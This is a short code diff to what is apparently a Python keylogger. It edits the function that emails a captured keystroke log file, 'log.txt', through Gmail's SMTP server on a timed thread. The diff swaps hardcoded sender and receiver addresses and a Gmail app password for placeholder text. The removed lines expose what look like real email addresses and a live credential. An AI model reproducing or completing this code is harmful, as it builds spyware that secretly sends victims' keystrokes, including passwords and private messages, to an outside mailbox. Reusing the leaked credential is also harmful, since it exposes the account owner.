@@ -53,8 +53,8 @@ def send_email_thread():
         time.sleep(120)
 
 def send_email():
-    sender_email = "hadinawfal.123@gmail.com"
-    receiver_email = "h07729647@gmail.com"
+    sender_email = "Put any email here"
+    receiver_email = "Put your email here and its App Password below"
     subject = "Email with Attachment"
     body = "Keystrokes in the attached log file."
     attachment_file = "log.txt"
@@ -76,7 +76,7 @@ def send_email():
 
     with smtplib.SMTP("smtp.gmail.com", 587) as server:
         server.starttls()
-        server.login(sender_email, "lnql xafs vibi knzy")  #Replace "your_password" with your actual email password
+        server.login(sender_email, "App Password Provided by Gmail Account(with spaces)") 
         server.sendmail(sender_email, receiver_email, message.as_string())
 
     print("Email with attachment sent successfully")
